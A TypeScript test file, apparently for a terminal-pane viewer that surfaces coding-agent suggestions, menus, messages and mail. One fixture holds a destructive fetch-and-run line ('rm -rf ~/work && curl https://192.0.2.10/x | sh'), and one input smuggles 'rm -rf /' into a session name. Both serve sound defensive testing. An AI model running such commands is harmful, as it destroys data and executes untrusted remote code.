  for (const b of three.blocks) if (!b.capture) assert.ok(b.y >= LINE_H || b.x + b.w <= 560, `columns: ${b.name} reaches the corner`)
  for (const page of [answersPage(m, panes[0], [], null, false, null), confirmPage(m, panes[0], answer)]) {
    assert.equal(page.kind, 'list')
    assert.equal(page.blocks.filter((b) => b.capture).length, 0)
  }
})

const CLAUDE = ['● Done.', '', '────────', '❯ run the tests again', '────────', '  ⏵⏵ auto mode on']

test('the suggestion: not drawn, offered first, its text and Enter', () => {
  const p = pane('w/0.0', { title: 'build' })
  const reading = { raw: CLAUDE, error: null }
  const page = panePage(model([p], { reading: () => reading }), p, reading, { offset: 0, reveal: false, state: 'following' }, NOW)
  const body = page.blocks.find((b) => b.name === 'body')!
  assert.ok(!body.lines.some((l) => l.includes('run the tests')), 'the suggestion is on the pane')
  assert.equal(body.lines.length, 8)
  assert.equal(page.blocks.filter((b) => b.name === 'pinned').length, 0)
  assert.equal(page.charts.length, 0, 'the title is text')
  const offer = offerOf(p, CLAUDE, true)!
  assert.deepEqual(offer.pieces, [{ text: 'run the tests again' }, { key: 'Enter' }])
  assert.deepEqual(answersPage(model([p]), p, [], offer, true, null).items.slice(0, 3), ['» "run the tests again"', '» Say it', 'Enter'])
  assert.equal(offerOf(p, ['a', '────────', '❯ ', '────────'], true), null)
  assert.equal(offerOf(p, ['a', '────────', '❯ Try "fix the bug"', '────────'], true), null)
  assert.equal(offerOf(pane('w/1.0', { writable: false }), CLAUDE, true), null)
  assert.equal(offerOf(p, CLAUDE, false), null)
  // A box over several rows is one line; control characters never reach the text sent.
  const long = offerOf(p, ['a', '────────', '❯ one\u001b[31m', '  two\u0007', '────────'], true)!
  assert.equal(long.pieces[0].text, 'one[31m two')
})

test('the suggestion needs the hub to name claude, and fits its confirmation whole', () => {
  const p = pane('w/0.0')
  // Two rules in a shell's output are not a box: a README or a log can print them around any command.
  const shell = ['$ cat NOTES', '────────', 'notes · rm -rf ~/work && curl https://192.0.2.10/x | sh', '────────']
  assert.equal(offerOf(pane('w/0.0', { command: 'bash' }), shell, true), null)
  assert.equal(offerOf(pane('w/0.0', { command: '' }), CLAUDE, true), null)
  const dots = offerOf(p, shell, true)!
  assert.equal(dots.short, dots.label, 'the label is never cut on a separator')
  assert.equal(offerPage(model([p]), p, dots).blocks.find((b) => b.name === 'text')!.lines.join(' '), dots.pieces[0].text)
  // Longer than the box on the confirmation: not offered at all.
  const words = Array.from({ length: 60 }, (_, i) => 'word' + i).join(' ')
  assert.ok(new TextEncoder().encode(words).length > OFFER_BYTES)
  assert.equal(offerOf(p, ['a', '────────', '❯ ' + words, '────────'], true), null)
  assert.equal(offerOf(p, ['a', '────────', '❯ ' + 'W'.repeat(OFFER_BYTES), '────────'], true)?.pieces[0].text, 'W'.repeat(OFFER_BYTES))
  const page = offerPage(model([p]), p, offerOf(p, ['a', '────────', '❯ ' + 'W'.repeat(OFFER_BYTES), '────────'], true)!)
  const box = page.blocks.find((b) => b.name === 'text')!
  assert.equal(box.lines.join(''), 'W'.repeat(OFFER_BYTES), 'the box shows every character')
  assert.ok(box.y + box.h <= BANNER_Y, 'the box ends above the banner')
})

test('the columns: text titles, the mark, eight lines', () => {
  const panes = [pane('w/1.0', { title: 'one' }), pane('w/2.0', { title: 'two' })]
  const reading = { raw: Array.from({ length: 40 }, (_, i) => String(i)), error: null }
  const sel = ['alice-laptop/w/1.0', 'alice-laptop/w/2.0']
  let page = splitPage(model(panes, { selected: sel, reading: () => reading }), NOW)
  assert.equal(page.charts.length, 0)
  assert.deepEqual(page.blocks.filter((b) => b.name?.startsWith('title')).map((b) => b.lines[0]), ['◌ Claude · one', '◌ Claude · two'])
  assert.equal(page.blocks.find((b) => b.name === 'col0')!.lines.length, 8)
  assert.equal(page.hint, '▽ pick a pane · ● refresh · ×× the list')
  page = splitPage(model(panes, { selected: sel, marked: 1, reading: () => reading }), NOW)
  assert.equal(page.blocks.find((b) => b.name === 'title1')!.lines[0], '» ◌ Claude · two')
  assert.equal(page.hint, '▽ next pane · ● open two · ×× the list')
})

test('a group is kept together after its first member, waiting panes still first', () => {
  const panes = [pane('work/0.0', { attention: 'question' }), pane('work/1.0', { talk: ['alice-laptop/work/3.0'] }), pane('work/2.0'), pane('work/3.0', { talk: ['alice-laptop/work/1.0'] }), pane('work/4.0', { attention: 'done' })]
  assert.deepEqual(sorted(panes).map((p) => p.path), ['work/0.0', 'work/4.0', 'work/1.0', 'work/3.0', 'work/2.0'])
  // A waiting member pulls its partner up to it.
  const up = [pane('work/0.0'), pane('work/1.0', { talk: ['alice-laptop/work/3.0'] }), pane('work/3.0', { attention: 'permission' })]
  assert.deepEqual(sorted(up).map((p) => p.path), ['work/3.0', 'work/1.0', 'work/0.0'])
})

test('rows of a group start with the bar and a pane with mail says so after its name', () => {
  const a = pane('work/1.0', { title: 'build', command: 'codex', talk: ['alice-laptop/work/2.0'], mail: 1 })
  const b = pane('work/2.0', { title: 'tests', command: 'claude', talk: ['alice-laptop/work/1.0'] })
  const lone = pane('work/0.0', { title: 'test-pane', command: 'bash', talk: ['alice-laptop/work/9.0'], mail: 3 })
  const m = model([lone, a, b])
  assert.deepEqual(listLayout(m, NOW).items, ['── alice-laptop · online ──', '◌ bash · test-pane · mail 3 · quiet 30s', '│ ◌ Codex · mail 1 · build · quiet 30s', '│ ◌ Claude · tests · quiet 30s'])
  // In selection mode the bar comes before the box.
  assert.equal(listLayout(model([lone, a, b], { selecting: true, selected: [a.address] }), NOW).items[2], '│ [x] ◌ Codex · mail 1 · build · quiet 30s')
  assert.equal(rowLabel(a, NOW), '◌ Codex · mail 1 · build · quiet 30s')
  // The titles carry the same.
  const groups = groupsOf(m.panes)
  assert.equal(titleOf(a, groups, NOW), '│ ◌ Codex · mail 1 · build')
  assert.equal(titleOf(lone, groups, NOW), '◌ bash · test-pane · mail 3')
  const title = panePage(m, b, undefined, { offset: 0, reveal: false, state: 'following' }, NOW).blocks.find((bl) => bl.name === 'title')
  assert.equal(title?.lines[0], '│ ◌ Claude · tests')
  // Nothing of it in the hint: no count, no toast.
  const page = listPage(m, NOW)
  assert.ok(!page.hint.includes('mail'), page.hint)
})

test('the pane menu: ten entries at most, the firmware\'s cap, each where it applies', () => {
  const able = { name: 'alice-laptop', online: true, later: true, sessions: true, close: true, mail: true, keys: 2 }
  const a = pane('w/1.0', { title: 'a', talk: ['alice-laptop/w/2.0'] })
  const b = pane('w/2.0', { title: 'b', talk: ['alice-laptop/w/1.0'], attention: 'permission', attentionAt: NOW - 5 })
  const m = model([a, b], { hosts: [able], needsYou: b })
  assert.deepEqual(paneMenu(m, a, false).map((e) => e.label), ['Reveal all', 'Bottom', 'Next pane', 'Previous pane', 'Later', 'Go to: b', 'Mail', 'Beside: b', 'Close pane', '+ pane'])
  assert.equal(paneMenu(m, a, false).length, 10)
  assert.equal(paneMenu(m, a, true)[0].label, 'Lens on')
  // One pane: no next or previous; a reader: no Later, Close or + pane, Mail still (reading the mailbox needs the read grant).
  assert.deepEqual(paneMenu(model([a], { hosts: [able] }), a, false).map((e) => e.label), ['Reveal all', 'Bottom', 'Later', 'Mail', 'Close pane', '+ pane'])
  const reader = { ...a, writable: false }
  assert.deepEqual(paneMenu(model([reader, b], { hosts: [able] }), reader, false).map((e) => e.label), ['Reveal all', 'Bottom', 'Next pane', 'Previous pane', 'Mail', 'Beside: b'])
  assert.equal(canClose({ hosts: [able] }, reader), false)
  assert.equal(canClose({ hosts: [{ ...able, close: false }] }, a), false)
  // The lens off: no Reveal all.
  assert.equal(paneMenu(model([a], { hosts: [able], lens: false }), a, false)[0].label, 'Bottom')
  // A partner that left the listing is no Beside.
  assert.equal(partnerOf({ panes: [a] }, a), undefined)
  assert.equal(partnerOf({ panes: [a, b] }, a)?.path, 'w/2.0')
})

test('next and previous: the list\'s order round at the ends, parked panes skipped', () => {
  const panes = sorted([pane('w/1.0', { title: 'one' }), pane('w/2.0', { title: 'two', later: true }), pane('w/3.0', { title: 'three' })])
  assert.equal(neighbour(panes, panes[0], 1)?.path, 'w/1.0' === panes[0].path ? 'w/3.0' : 'w/1.0')
  assert.deepEqual(panes.map((p) => p.path), ['w/1.0', 'w/3.0', 'w/2.0'])
  assert.equal(neighbour(panes, panes[1], 1)?.path, 'w/1.0', 'round the end, the parked one skipped')
  assert.equal(neighbour(panes, panes[0], -1)?.path, 'w/3.0')
  assert.equal(neighbour([panes[0]], panes[0], 1), undefined)
  assert.equal(neighbour([panes[0], panes[2]], panes[0], 1), undefined, 'only a parked other')
  assert.equal(neighbour(panes, pane('w/9.0'), 1)?.path, 'w/3.0', 'a pane gone from the list: from the top')
})

test('close, split and sessions: the questions, the direction, the name folded, the default name', () => {
  const p = pane('w/1.0', { alias: 'build', session: 'work' })
  assert.equal(closeQuestion(p), 'close build on alice-laptop?')
  assert.equal(closeQuestion({ ...p, last: true }), 'end session work on alice-laptop?')
  assert.equal(splitDirection({ width: 160, height: 40 }), 'h')
  assert.equal(splitDirection({ width: 80, height: 41 }), 'v')
  assert.equal(splitDirection({ width: 0, height: 0 }), 'h')
  assert.equal(sessionName('My Scratch!!'), 'my-scratch')
  assert.equal(sessionName('  rm -rf / ; x  '), 'rm-rf-x')
  assert.equal(sessionName('\x1b[2J☃'), '2j')
  assert.equal(sessionName('☃ !!'), '')
  assert.equal(sessionName('a'.repeat(50)).length, 32)
  assert.equal(defaultSession([pane('glasses-1/0.0', { session: 'glasses-1' }), pane('glasses-2/0.0', { session: 'glasses-2' })], 'alice-laptop'), 'glasses-3')
  assert.equal(defaultSession([pane('glasses-1/0.0', { session: 'glasses-1', host: 'bob' })], 'alice-laptop'), 'glasses-1')
  const ask = askPage(model([p]), 'close build on alice-laptop?')
  assert.deepEqual([ask.kind, ask.items, ask.hint], ['list', ['Cancel', 'Confirm'], 'close build on alice-laptop? · ×× back'])
  assert.deepEqual(sessionPage(model([p]), 'alice-laptop', 'glasses-1', true).items, ['» glasses-1', '» Say it'])
  assert.deepEqual(sessionPage(model([p]), 'alice-laptop', 'glasses-1', false).items, ['» glasses-1'])
})

test('host lines: one per online host, its state and + session; offline hosts stay in the hint; a host the hosts call missed is drawn from its panes', () => {
  const alice = { name: 'alice-laptop', online: true, later: false, sessions: true, close: false, mail: false, keys: 2 }
  const bob = { ...alice, name: 'bob-desktop', sessions: false }
  const carol = { ...alice, name: 'carol-pc', online: false }
  const panes = [pane('w/1.0', { title: 'one' })]
  assert.equal(hostLine(alice, panes), '── alice-laptop · online · + session ──')
  assert.equal(hostLine(bob, panes), '── bob-desktop · nothing exposed ──')
  assert.deepEqual(listedHosts({ hosts: [carol, bob, alice], panes }).map((h) => h.name), ['alice-laptop', 'bob-desktop'])
  assert.deepEqual(listedHosts({ hosts: [], panes }).map((h) => h.name), ['alice-laptop'])
  const l = listLayout(model(panes, { hosts: [carol, bob, alice] }), NOW)
  assert.deepEqual(l.items, ['── alice-laptop · online · + session ──', '◌ Claude · one · quiet 30s', '── bob-desktop · nothing exposed ──'])
  assert.deepEqual(l.what.map((w) => w.kind), ['host', 'pane', 'host'])
  assert.ok(listPage(model(panes, { hosts: [carol, bob, alice] }), NOW).hint.includes('○ carol-pc offline'))
  // The messages row under the inbox row while the feed holds anything, with the count of what was not looked at.
  const m = model(panes, { feed: true, unseen: 3 })
  assert.deepEqual(listLayout(m, NOW).items[0], '» messages · mail 3')
  assert.deepEqual(listLayout(model(panes, { feed: true }), NOW).items[0], '» messages')
  assert.equal(listLayout(m, NOW).what[0].kind, 'messages')
  const waits = model([pane('w/2.0', { attention: 'done', attentionAt: NOW })], { feed: true, unseen: 1 })
  assert.deepEqual(listLayout(waits, NOW).items.slice(0, 2), ['◆ inbox · 1 waiting', '» messages · mail 1'])
})

const end = (path: string, id = '', alias = '') => ({ address: 'alice-laptop/' + path, id, alias })
const talk = (seq: number, o: Partial<Talk> = {}): Talk => ({ seq, at: NOW - 60 * seq, kind: 'text', from: end('w/1.0', '%1'), to: end('w/2.0', '%2'), actor: 'reviewer', text: 'run the tests', bytes: 13, id: 0, replyTo: 0, ...o })

test('the messages page: who → whom and the age on a row, the text under it, a reply one step in, names by alias, by id, by address, else the actor', () => {
  const one = pane('w/1.0', { alias: 'review', id: '%1' })
  const two = pane('w/2.0', { title: 'build', id: '%2' })
  const m = model([one, two])
  const feed = [
    talk(1),
    talk(2, { kind: 'mail', id: 7, text: 'one more thing: the docs', from: null }),
    talk(3, { kind: 'mail', id: 8, replyTo: 7, from: end('w/2.0', '%2'), to: end('w/1.0', '%1'), text: 'done' }),
    talk(4, { kind: 'key', text: 'Enter ×3' }),
    talk(5, { kind: 'answer', text: 'yes', from: end('w/9.0', '%9') }),
    talk(6, { kind: 'mail', id: 9, replyTo: 77, text: 'to a mail not here' }),
  ]
  const { items, entry } = messagesLayout(m, feed, NOW)
  assert.deepEqual(items, [
    'review → build · 1m',
    '    run the tests',
    'reviewer → build · 2m · mail',
    '    one more thing: the docs',
    '  build → review · 3m · reply',
    '      done',
    'review → build · 4m · key',
    '    Enter ×3',
    'w/9.0 → build · 5m · answer',
    '    yes',
    'review → build · 6m · reply',
    '    to a mail not here',
  ])
  assert.deepEqual(entry, [0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5])
  assert.equal(endName(m, null, ''), 'someone')
  assert.equal(endName(m, end('w/7.0', '%2'), ''), 'build', 'the id wins over a moved address')
  assert.ok(involves(feed[0], one) && involves(feed[0], two) && !involves(feed[0], pane('w/3.0')))
  const page = messagesPage(m, feed, null, 5, 0, NOW)
  assert.equal(page.kind, 'dash')
  assert.ok(page.hint.startsWith('messages · 6 · ▽ move · ● the mail · ×× back'), page.hint)
  assert.ok(messagesPage(m, feed, null, 0, 0, NOW).hint.includes('● side by side'))
  assert.ok(messagesPage(m, feed, two, 0, 0, NOW).hint.startsWith('messages · build · 6'))
  const rows = page.blocks.find((b) => b.name?.startsWith('rows'))!.lines
  assert.ok(rows.some((r) => r.startsWith('> review → build · 6m · reply')), rows)
  assert.deepEqual(messagesLayout(m, [], NOW).items, ['nothing said yet'])
  // A long text: three rows, the third cut.
  const long = underRows('word '.repeat(80), '    ')
  assert.equal(long.length, 3)
  assert.ok(long[2].endsWith('…') && long.every((r) => r.startsWith('    ')), long)
  assert.equal(underRows('short', '  ').length, 1)
})

test('the mail page: what came in from the mailbox, what went out from the feed, merged by time; mail back only to a writable origin in the listing', () => {
  const build = pane('w/2.0', { title: 'build', id: '%2' })
  const review = pane('w/1.0', { alias: 'review', id: '%1' })
  const m = model([build, review], { hosts: [{ name: 'alice-laptop', online: true, later: true, sessions: false, close: false, mail: true, keys: 2 }] })
  const mail = (id: number, o: Partial<Mail> = {}): Mail => ({ id, at: NOW - 100 * id, from: end('w/1.0', '%1', 'review'), actor: 'reviewer', text: 'run the tests', readAt: 0, replied: false, ...o })
  const box = [mail(1, { readAt: NOW - 50, replied: true }), mail(2, { from: null })]
  const feed = [talk(1, { kind: 'mail', id: 3, from: end('w/2.0', '%2'), to: end('w/1.0', '%1'), text: 'all green', bytes: 500, at: NOW - 150 }), talk(2, { kind: 'mail', id: 4, from: end('w/9.0'), to: end('w/2.0'), text: 'not mine' }), talk(3, { text: 'typed, not mail', from: end('w/2.0', '%2') })]
  const entries = mailEntries(box, feed, build)
  assert.deepEqual(entries.map((e) => (e.kind === 'in' ? 'in ' + e.mail.id : 'out ' + e.talk.id)), ['in 2', 'out 3', 'in 1'])
  const { items, entry } = mailLayout(m, entries, NOW)
  assert.deepEqual(items, ['← reviewer · 3m · unread', '    run the tests', '→ review · 2m · cut', '    all green', '← review · 1m · replied', '    run the tests'])
  assert.deepEqual(entry, [0, 0, 1, 1, 2, 2])
  assert.equal(mailBackTo(m, entries[2])?.path, 'w/1.0')
  assert.equal(mailBackTo(m, entries[0]), undefined, 'no origin')
  assert.equal(mailBackTo(m, entries[1]), undefined, 'sent, not received')
  assert.equal(mailBackTo(model([build, { ...review, writable: false }]), entries[2]), undefined, 'a reader may not mail back')
  const page = mailPage(m, build, box, feed, 2, 0, NOW)
  assert.deepEqual(page.menu.map((e) => e.label), ['Mail build', 'Messages with build'])
  assert.ok(page.hint.startsWith('mail · build · 1 unread · ● mail back · ≡ menu · ×× back'), page.hint)
  assert.ok(!mailPage(m, build, box, feed, 0, 0, NOW).hint.includes('mail back'))
  assert.deepEqual(mailPage(m, { ...build, writable: false }, box, feed, 0, 0, NOW).menu.map((e) => e.label), ['Messages with build'])
  assert.deepEqual(mailPage(m, build, null, feed, 0, 0, NOW).blocks[0].lines[0], '  reading the mail…')
  assert.deepEqual(mailLayout(m, [], NOW).items, ['no mail'])
})
